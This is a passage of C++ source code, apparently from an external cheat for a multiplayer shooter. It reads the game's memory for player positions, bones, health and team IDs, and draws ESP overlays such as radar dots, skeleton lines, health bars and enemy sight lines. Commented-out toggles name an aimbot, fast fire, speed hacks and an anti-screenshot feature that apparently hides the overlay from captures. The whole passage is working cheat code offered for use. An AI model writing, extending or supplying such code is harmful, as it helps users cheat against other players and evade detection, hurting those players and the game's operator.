					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "CameraCatch Activated" });
					//		CameraCatch1 = true;
					//	}
					//	else if (!Setting::CameraCatch && CameraCatch1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "CameraCatch deActivated" });
					//		CameraCatch1 = false;
					//
					//	}
					//	if (Setting::CameraAimBot && !CameraAimBot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "CameraAimBot Activated" });
					//		CameraAimBot1 = true;
					//	}
					//	else if (!Setting::CameraAimBot && CameraAimBot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "CameraAimBot deActivated" });
					//		CameraAimBot1 = false;
					//
					//	}
					//	if (Setting::ForceTPP && !ForceTPP1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "ForceTPP Activated" });
					//		ForceTPP1 = true;
					//	}
					//	else if (!Setting::ForceTPP && ForceTPP1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "ForceTPP deActivated" });
					//		ForceTPP1 = false;
					//
					//	}
					//	//
					//	if (Setting::FastWeponSwith && !FastWeponSwith1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "FastWeponSwith Activated" });
					//		FastWeponSwith1 = true;
					//	}
					//	else if (!Setting::FastWeponSwith && FastWeponSwith1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "FastWeponSwith deActivated" });
					//		FastWeponSwith1 = false;
					//
					//	}
					//	if (Setting::ScopeZoom && !ScopeZoom1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "ScopeZoom Activated" });
					//		ScopeZoom1 = true;
					//	}
					//	else if (!Setting::ScopeZoom && ScopeZoom1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "ScopeZoom deActivated" });
					//		ScopeZoom1 = false;
					//
					//	}
					//	if (Setting::MagicX && !XEffect1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "XEffect Activated" });
					//		XEffect1 = true;
					//	}
					//	else if (!Setting::MagicX && XEffect1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "XEffect deActivated" });
					//		XEffect1 = false;
					//
					//	}
					//	//
					//	if (Setting::speedcar && !speedcar1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "speedcar Activated" });
					//		speedcar1 = true;
					//	}
					//	else if (!Setting::speedcar && speedcar1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "speedcar deActivated" });
					//		speedcar1 = false;
					//
					//	}
					//	if (Setting::fastShoot && !fastShoot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Fast Fire Activated" });
					//		fastShoot1 = true;
					//	}
					//	else if (!Setting::fastShoot && fastShoot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Fast Fire deActivated" });
					//		fastShoot1 = false;
					//
					//	}
					//	if (Setting::ShowDaamge && !ShowDaamge1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "ShowDaamge Activated" });
					//		ShowDaamge1 = true;
					//	}
					//	else if (!Setting::ShowDaamge && ShowDaamge1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "ShowDaamge deActivated" });
					//		ShowDaamge1 = false;
					//
					//	}
					//	if (Setting::Quickloot && !Quickloot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Fast Loot Activated" });
					//		Quickloot1 = true;
					//	}
					//	else if (!Setting::Quickloot && Quickloot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Fast Loot deActivated" });
					//		Quickloot1 = false;
					//
					//	}
					//	/////////////////////////////////////////////////////////////////////////////////////////////
					//
					//	if (Setting::ShowSideMenu && !ShowSideMenu1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Side Menu Activated" });
					//		ShowSideMenu1 = true;
					//	}
					//	else if (!Setting::ShowSideMenu && ShowSideMenu1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Side Menu deActivated" });
					//		ShowSideMenu1 = false;
					//
					//	}
					//	if (Setting::TotalEnemy && !TotalEnemy1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "TotalEnemy Activated" });
					//		TotalEnemy1 = true;
					//	}
					//	else if (!Setting::TotalEnemy && TotalEnemy1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "TotalEnemy deActivated" });
					//		TotalEnemy1 = false;
					//
					//	}
					//	if (Setting::gameinfo && !gameinfo1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Game info Activated" });
					//		gameinfo1 = true;
					//	}
					//	else if (!Setting::gameinfo && gameinfo1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Game info deActivated" });
					//		gameinfo1 = false;
					//
					//	}
					//	if (Setting::SnowFlake && !SnowFlake11)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Snow Flake Activated" });
					//		SnowFlake11 = true;
					//	}
					//	else if (!Setting::SnowFlake && SnowFlake11)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Snow Flake deActivated" });
					//		SnowFlake11 = false;
					//
					//	}
					//	if (Setting::wwcd && !wwcd1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Auto Send Wins Photo Activated" });
					//		wwcd1 = true;
					//	}
					//	else if (!Setting::wwcd && wwcd1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Auto Send Wins Photo deActivated" });
					//		wwcd1 = false;
					//
					//	}
					//	if (Setting::AntiScreenShot && !AntiScreenShot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "Anti Stream Activated" });
					//		AntiScreenShot1 = true;
					//	}
					//	else if (!Setting::AntiScreenShot && AntiScreenShot1)
					//	{
					//		ImGui::InsertNotification({ ImGuiToastType_Error, 3000, "Anti Stream deActivated" });
					//		AntiScreenShot1 = false;
					//
					//	}
					//}
					//
					//ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 5.f); // Round borders
					//ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(43.f / 255.f, 43.f / 255.f, 43.f / 255.f, 100.f / 255.f)); // Background color
					//ImGui::RenderNotifications(); // <-- Here we render all notifications
					//ImGui::PopStyleVar(1);
					//ImGui::PopStyleColor(1);
					ViewMatrix = Utility::ReadMemoryEx<D3DMATRIX>(Utility::ReadMemoryEx<DWORD>(Utility::ReadMemoryEx<DWORD>(Data::ViewMatrixBase) + 0x20) + 0x200);
					Data::CameraCache = Utility::ReadMemoryEx<CameraCacheEntry>(Data::PlayerCameraManager + Offset::PlayerCameraManager1::CameraCache);
					TempAActorList.clear();
					TempAActorList = Data::AActorList;
					DWORD MeshAddv1 = Utility::ReadMemoryEx<DWORD>(Data::LocalPlayer + Offset::Mesh);
					DWORD BodyAddv1 = MeshAddv1 + Offset::BodyAddv;
					DWORD BoneAddv1 = Utility::ReadMemoryEx<DWORD>(MeshAddv1 + Offset::MinLOD) + 48;


					Data::lOCALPLAYERHEAD = Algorithm::GetBoneWorldPosition(BodyAddv1, BoneAddv1 + 5 * 48);
					Data::lOCALPLAYERPosotion = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(Data::LocalPlayerAddr + Offset::RootComponent) + Offset::Position);
					if (Setting::ShowSideMenu)
					{
						DrawMenu2();
					}
					if (Data::AActorList.size() != 0)
					{

						for (AActor& AActor : Data::AActorList)
						{
							int _dist;
							AActor.Position = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(AActor.Address + Offset::RootComponent) + Offset::Position);
							teamids = AActor.TeamId;
							col = ImColor(teamids, teamids, teamids, 255);

							weapon = AActor.Weapon;
							PName = AActor.Name;

							linescolors = ImVec4(sin(5.f * teamids + 0.f) * 127 + 128 / 255.0f, sin(5.f * teamids + ((2.f * 3.14159265358979323846) / 3)) * 127 + 128 / 255.0f, sin(5.f * teamids + ((4.f * 3.14159265358979323846) / 3)) * 127 + 128 / 255.0f, 255 / 255.0f);
							bonescolors = Colors::playerbone;
							fullboxcolor = Colors::playerbox;

							if (Setting::dots)
							{
								float S_height = DX11Window::Height;
								float S_width = DX11Window::Width;
								bool shit = false;
								VECTOR3 EntityPos = WorldToRadar(Data::CameraCache.POV.Rotation.Yaw, AActor.Position, Data::CameraCache.POV.Location, NULL, NULL, ToVECTOR3(S_width, S_height, 0), shit);
								int radar_range = Setting::DotsRange;//
								int x, y;
								x = EntityPos.X;
								y = EntityPos.Y;

								VECTOR3 angle{};
								VECTOR3 temmp = ToVECTOR3((float)(S_width / 2) - x, (float)(S_height / 2) - y, 0.f);

								VectorAnglesRadar(temmp, angle);

								const auto angle_yaw_rad = DEG2RAD(angle.Y + 180.f);
								const auto new_point_x = (S_width / 2) + (radar_range) / 2 * 8 * cosf(angle_yaw_rad);
								const auto new_point_y = (S_height / 2) + (radar_range) / 2 * 8 * sinf(angle_yaw_rad);

								std::array<VECTOR3, 3> points
								{
									ToVECTOR3(new_point_x - ((90) / 4 + 3.5f) / 2, new_point_y - ((radar_range) / 4 + 3.5f) / 2, 0.f),
									ToVECTOR3(new_point_x + ((90) / 4 + 3.5f) / 4, new_point_y, 0.f),
									ToVECTOR3(new_point_x - ((90) / 4 + 3.5f) / 2, new_point_y + ((radar_range) / 4 + 3.5f) / 2, 0.f)
								};
								RotateTriangle(points, angle.Y + 180.f);

								if (dotsstyle == 0)
								{
									if (AActor.IsBot) {
										DX11::ImGui_DX11::DrawCircle2(points.at(1).X, points.at(1).Y, Setting::DotsRadius, DX11::ImGui_DX11::Color::White);
									}
									else {
										DX11::ImGui_DX11::DrawCircle2(points.at(1).X, points.at(1).Y, Setting::DotsRadius, linescolors);

									}
								}
								else if (dotsstyle == 1)
								{
									if (AActor.IsBot) {
										DX11::ImGui_DX11::DrawCircle(points.at(1).X, points.at(1).Y, Setting::DotsRadius, DX11::ImGui_DX11::Color::White, Setting::DotsThickness);
									}
									else {
										DX11::ImGui_DX11::DrawCircle(points.at(1).X, points.at(1).Y, Setting::DotsRadius, linescolors, Setting::DotsThickness);

									}
								}
								else if (dotsstyle == 2)
								{
									if (AActor.IsBot) {
										DX11::ImGui_DX11::DrawTriangle(points.at(0).X, points.at(0).Y, points.at(1).X, points.at(1).Y, points.at(2).X, points.at(2).Y, 2, Colors::bot);
									}
									else {
										DX11::ImGui_DX11::DrawTriangle(points.at(0).X, points.at(0).Y, points.at(1).X, points.at(1).Y, points.at(2).X, points.at(2).Y, 2, linescolors);
									}
								}
								else if (dotsstyle == 3)
								{
									if (AActor.IsBot) {
										DX11::ImGui_DX11::DrawTriangleFilled(points.at(0).X, points.at(0).Y, points.at(1).X, points.at(1).Y, points.at(2).X, points.at(2).Y, 2, Colors::bot);
									}
									else {
										DX11::ImGui_DX11::DrawTriangleFilled(points.at(0).X, points.at(0).Y, points.at(1).X, points.at(1).Y, points.at(2).X, points.at(2).Y, 2, linescolors);
									}
								}

								std::string lol1;
								if (Setting::Lang == 0 || Setting::Lang == 2)
								{
									if (AActor.IsBot)
									{
										lol1 = "Bot [" + to_string(_dist) + "M]";
									}
									else
									{
										lol1 = "Player [" + to_string(_dist) + "M]";
									}
								}
								else if (Setting::Lang == 1)
								{
									if (AActor.IsBot)
									{
										lol1 = u8"ﺕﻮﺑ [ﺮﺘﻣ " + to_string(_dist) + u8"]";
									}
									else
									{
										lol1 = u8"ﺐﻋﻻ [ﺮﺘﻣ " + to_string(_dist) + u8"]";
									}
								}
								if (Screen.X > DX11Window::Width && Screen.Y > 0 && Screen.Y < DX11Window::Height)//Right
								{
									if (AActor.IsBot)
									{
										DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, 20, lol1, DX11Window::Width - 20, Screen.Y + Screen.Z, DX11::ImGui_DX11::Color::White, true);
									}
									else
									{
										DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, 20, lol1, DX11Window::Width - 20, Screen.Y + Screen.Z, linescolors, true);

									}
								}
								if (Screen.X < 0 && Screen.Y  >0 && Screen.Y < DX11Window::Height)//Left
								{
									if (AActor.IsBot)
									{
										DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, 20, lol1, 20, Screen.Y + Screen.Z, DX11::ImGui_DX11::Color::White, true);
									}
									else
									{
										DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, 20, lol1, 20, Screen.Y + Screen.Z, linescolors, true);
									}
								}
								if (Screen.Y < 0 && Screen.X>0 && Screen.X < DX11Window::Width)//Top
								{
									if (AActor.IsBot)
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, Screen.X, 0, linescolors, true);
									}
									else
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, Screen.X, 0, DX11::ImGui_DX11::Color::White, true);
									}
								}
								if (Screen.Y > DX11Window::Height && Screen.X > 0 && Screen.X < DX11Window::Width)//Bottom
								{
									if (AActor.IsBot)
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, Screen.X, DX11Window::Height - 20, linescolors, true);
									}
									else
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, Screen.X, DX11Window::Height - 20, DX11::ImGui_DX11::Color::White, true);
									}
								}
								if (Screen.X < 0 && Screen.Y < 0)//top left
								{
									if (AActor.IsBot)
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, 0, 0, linescolors, true);
									}
									else
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, 0, 0, DX11::ImGui_DX11::Color::White, true);
									}
								}
								if (Screen.X > DX11Window::Width && Screen.Y > DX11Window::Height)//bottom right
								{
									if (AActor.IsBot)
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, DX11Window::Width - 40, DX11Window::Height - 20, linescolors, true);
									}
									else
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, DX11Window::Width - 40, DX11Window::Height - 20, DX11::ImGui_DX11::Color::White, true);
									}
								}
								if (Screen.X > DX11Window::Width && Screen.Y < 0)//top right
								{
									if (AActor.IsBot)
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, DX11Window::Width - 40, 0, linescolors, true);
									}
									else
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, DX11Window::Width - 40, 0, DX11::ImGui_DX11::Color::White, true);
									}
								}
								if (Screen.X<0 && Screen.Y >DX11Window::Width)//bottom left
								{
									if (AActor.IsBot)
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, 0, DX11Window::Height - 20, linescolors, true);
									}
									else
									{
										DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 20, lol1, 0, DX11Window::Height - 20, DX11::ImGui_DX11::Color::White, true);
									}
								}
							}
							if (Setting::radar)
							{

								float S_height = DX11Window::Height;
								float S_width = DX11Window::Width;
								DrawRadarHUD(Data::CameraCache.POV, AActor, Distance, 20, 50, 100, 100, linescolors);
							}
							if (!Algorithm::WorldToScreenPlayer(Data::lOCALPLAYERPosotion, AActor.Position, Screen, &_dist, ViewMatrix)) continue;
							temp = AActor.Name.c_str();
							ImVec2 TempSize = ImGui::CalcTextSize(temp.c_str());
							float NameInSize = TempSize.x;

							DWORD MeshAddv;
							DWORD BodyAddv;
							DWORD BoneAddv;

							//if (Setting::Bone || Setting::MagicBullet)
							//{
							//	MeshAddv = Utility::ReadMemoryEx<DWORD>(AActor.Address + Offset::Mesh);
							//	BodyAddv = MeshAddv + Offset::BodyAddv;
							//	BoneAddv = Utility::ReadMemoryEx<DWORD>(MeshAddv + Offset::MinLOD) + 48;
							//	AActor.HeadPos = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + 5 * 48);
							//}
							if (Setting::Bone)
							{
								MeshAddv = Utility::ReadMemoryEx<DWORD>(AActor.Address + Offset::Mesh);
								if (!MeshAddv)continue;
								BodyAddv = MeshAddv + Offset::BodyAddv;
								if (!BodyAddv)continue;
								BoneAddv = Utility::ReadMemoryEx<DWORD>(MeshAddv + Offset::MinLOD) + 48;
								if (!BoneAddv)continue;

								if (BoneAddv) {
									AActor.Bones.HeadPos = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::Head * 48);
									AActor.Bones.HeadPos.Z += 7;
									AActor.Bones.ChestPos = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::Chest * 48);
									AActor.Bones.PelvisPos = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::Pelvis * 48);
									AActor.Bones.LEFTSHOULDER = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::LeftSholder * 48);
									AActor.Bones.RIGHTSHOULDER = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::RightSholder * 48);
									AActor.Bones.LEFTELBOWROLL = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::LeftElbow * 48);
									AActor.Bones.RIGHTELBOWROLL = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::RightElbow * 48);
									AActor.Bones.LEFTHAND = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::LeftWrist * 48);
									AActor.Bones.RIGHTHAND = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::RightWrist * 48);
									AActor.Bones.LEFTLEGS = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::LeftThigh * 48);
									AActor.Bones.RIGHTLEGS = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::RightThigh * 48);
									AActor.Bones.LEFTKNEEROLL = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::LeftKnee * 48);
									AActor.Bones.RIGHTKNEEROLL = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::RightKnee * 48);
									AActor.Bones.LEFTFOOT = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::LeftAnkle * 48);
									AActor.Bones.RIGHTFOOT = Algorithm::GetBoneWorldPosition(BodyAddv, BoneAddv + BoneIndex::RightAnkle * 48);
								}


							}
							HeadPos = AActor.Bones.HeadPos;
							HeadPos.Z += 7;
							if (!Algorithm::WorldToScreenBone1(ViewMatrix, HeadPos, Head, &Distance)) continue;
							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.ChestPos, Chest, &Distance)) continue;
							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.PelvisPos, Pelvis, &Distance)) continue;

							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.LEFTSHOULDER, LEFTSHOULDER, &Distance)) continue;
							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.RIGHTSHOULDER, RIGHTSHOULDER, &Distance)) continue;

							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.LEFTELBOWROLL, LEFTELBOWROLL, &Distance)) continue;
							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.RIGHTELBOWROLL, RIGHTELBOWROLL, &Distance)) continue;

							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.LEFTHAND, LEFTHAND, &Distance)) continue;
							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.RIGHTHAND, RIGHTHAND, &Distance)) continue;

							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.LEFTLEGS, LEFTLEGS, &Distance)) continue;
							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.RIGHTLEGS, RIGHTLEGS, &Distance)) continue;

							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.LEFTKNEEROLL, LEFTKNEEROLL, &Distance)) continue;
							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.RIGHTKNEEROLL, RIGHTKNEEROLL, &Distance)) continue;

							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.LEFTFOOT, LEFTFOOT, &Distance)) continue;
							if (!Algorithm::WorldToScreenBone1(ViewMatrix, AActor.Bones.RIGHTFOOT, RIGHTFOOT, &Distance)) continue;

							if (Distance < Setting::PlayerMAxDistance)
							{

								if (AActor.IsBot)
								{
									linescolors = Colors::bot;
									if (Setting::Lang == 0 || Setting::Lang == 2)
									{
										temp = "Robot";
									}
									else if (Setting::Lang == 1)
									{
										temp = u8"ﺕﻮﺑ";
									}
								}
								if (!Setting::enemyoffscreen)
								{

								}

								if (Setting::EnemyLineOfSight)
								{
									VECTOR3 hed = AActor.Bones.HeadPos;
									hed.Z += 7.0f;
									VECTOR3 SightAngle = FRotatorToVector(AActor.RelativeRotation);
									VECTOR3 end = ADDVECTORS(hed, MULTIPLYVECT(SightAngle, Setting::enemyLineofSightSize));

									VECTOR3 screen_start, screen_end;
									int dis;
									if (Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, hed, screen_start, &dis, ViewMatrix) && Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, end, screen_end, &dis, ViewMatrix)) {
										DX11::ImGui_DX11::DrawLine(screen_start.X, screen_start.Y, screen_end.X, screen_end.Y, ImColor(Setting::EnemyLineOfSightColor[0], Setting::EnemyLineOfSightColor[1], Setting::EnemyLineOfSightColor[2], Setting::EnemyLineOfSightColor[3]), 2);
										DX11::ImGui_DX11::DrawCircle(screen_end.X, screen_end.Y, 1.f, linescolors, 1.0f);

									}
								}
								string BOT = "";
								if (Setting::Lang == 0 || Setting::Lang == 2)
								{
									BOT = "Robot";
								}
								else if (Setting::Lang == 1)
								{
									BOT = u8"ﺕﻮﺑ";
								}
								string TemID = std::to_string(teamids) + ". ";
								std::string dist = "";
								if (Setting::Lang == 0 || Setting::Lang == 2)
								{
									dist = std::to_string(_dist) + "M";
								}
								else if (Setting::Lang == 1)
								{
									dist = u8"ﺮﺘﻣ" + std::to_string(_dist);
								}

								if (AActor.IsBot)
								{
									if (Setting::botline)
									{
										if (Setting::botlineColorVer == 0)
										{

											if (AActor.Visible == 1)
											{
												DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, 0, Screen.X, Screen.Y - 5, ImColor(Setting::botlinecoloropen[0], Setting::botlinecoloropen[1], Setting::botlinecoloropen[2], Setting::botlinecoloropen[3]), Setting::plinesize);
											}
											else if (AActor.Visible == 0)
											{
												DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, 0, Screen.X, Screen.Y - 5, ImColor(Setting::botlinecolorcover[0], Setting::botlinecolorcover[1], Setting::botlinecolorcover[2], Setting::botlinecolorcover[3]), Setting::plinesize);
											}
										}
										//f (Setting::botlineColorVer == 0)
										//
										//   DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, 0, Screen.X, Screen.Y - 5, ImColor(Setting::botlinecolor[0], Setting::botlinecolor[1], Setting::botlinecolor[2], Setting::botlinecolor[3]), Setting::plinesize);
										//   
										//	
										else if (Setting::botlineColorVer == 1)
										{

											DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, 0, Screen.X, Screen.Y - 5, linescolors, Setting::plinesize);

										}
									}

									if (Setting::bothealth)
									{
										if (Setting::BotEspStyle == 0)
										{
											if (AActor.Health > 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Green);
											}
											else if (AActor.Health > 30.0 && AActor.Health <= 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Yellow);
											}
											else if (AActor.Health > 0.0 && AActor.Health <= 30.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Red);

											}
											else  if (AActor.Health <= 0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.KnockedHealth / AActor.HealthMax, DX11::ImGui_DX11::Color::Red);
											}
										}
										else if (Setting::BotEspStyle == 1)
										{
											DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 8, healthBarWidth, 3, DX11::ImGui_DX11::Color::Black);
											if (AActor.Health > 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 8, (healthBarWidth * AActor.Health / AActor.HealthMax), 3, DX11::ImGui_DX11::Color::Green);
											}
											if (AActor.Health > 30.0 && AActor.Health <= 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 8, (healthBarWidth * AActor.Health / AActor.HealthMax), 3, DX11::ImGui_DX11::Color::Yellow);
											}
											if (AActor.Health > 0.0 && AActor.Health <= 30.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 8, (healthBarWidth * AActor.Health / AActor.HealthMax), 3, DX11::ImGui_DX11::Color::Red);
											}
											else  if (AActor.Health <= 0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 8, (healthBarWidth * AActor.KnockedHealth / AActor.HealthMax), 3, DX11::ImGui_DX11::Color::Red);
											}
										}
										else if (Setting::BotEspStyle == 2)
										{
											float rounding = 3.0f;
											DX11::ImGui_DX11::DrawUnFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, 100, 20, DX11::ImGui_DX11::Color::Black2, rounding);
											if (AActor.Health > 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, (100 * AActor.Health / AActor.HealthMax), 20, DX11::ImGui_DX11::Color::Green2, rounding);
											}
											if (AActor.Health > 30.0 && AActor.Health <= 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, (100 * AActor.Health / AActor.HealthMax), 20, DX11::ImGui_DX11::Color::Yellow2, rounding);
											}
											if (AActor.Health > 0.0 && AActor.Health <= 30.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, (100 * AActor.Health / AActor.HealthMax), 20, DX11::ImGui_DX11::Color::Red2, rounding);
											}
											else  if (AActor.Health <= 0)
											{
												DX11::ImGui_DX11::DrawFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, (100 * AActor.KnockedHealth / AActor.HealthMax), 20, DX11::ImGui_DX11::Color::Red2, rounding);
											}
										}
										else if (Setting::BotEspStyle == 3)
										{
											if (AActor.Health > 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Green);
											}
											else if (AActor.Health > 30.0 && AActor.Health <= 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Yellow);
											}
											else if (AActor.Health > 0.0 && AActor.Health <= 30.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Red);

											}
											else  if (AActor.Health <= 0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.KnockedHealth / AActor.HealthMax, DX11::ImGui_DX11::Color::Red);
											}
											DX11::ImGui_DX11::DrawUnFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 3, (Screen.Z + 5), DX11::ImGui_DX11::Color::Black);
										}
									}
									if (Setting::botname)
									{
										if (Setting::BotEspStyle == 0)
										{
											if (AActor.Health <= 0)
											{
												if (AActor.IsBot)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - BotXPos, Screen.Y - BotYPos, DX11::ImGui_DX11::Color::Red, BOT.c_str(), botnsize, false);
												}
											}
											else
											{
												if (AActor.IsBot)
												{
